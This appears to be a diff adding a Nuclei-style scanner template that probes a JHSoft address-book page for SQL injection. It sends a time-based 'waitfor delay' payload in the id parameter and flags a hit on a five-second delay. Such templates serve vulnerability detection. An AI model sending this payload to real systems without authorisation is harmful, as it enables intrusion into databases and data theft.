@@ -1,0 +1,23 @@
+id: JHSoft-BookUpdate-sqlInjection
+info:
+  name: JHSoft-BookUpdate-sqlInjection
+  author: iSee857
+  severity: high
+  description: JHSoft-BookUpdate-sqlInjection
+
+requests:
+  - method: GET
+    raw:
+      - |
+        GET /c6/Jhsoft.Web.AddressBook/BookUpdate.aspx/?id=1%27waitfor+delay%270%3A0%3A5%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
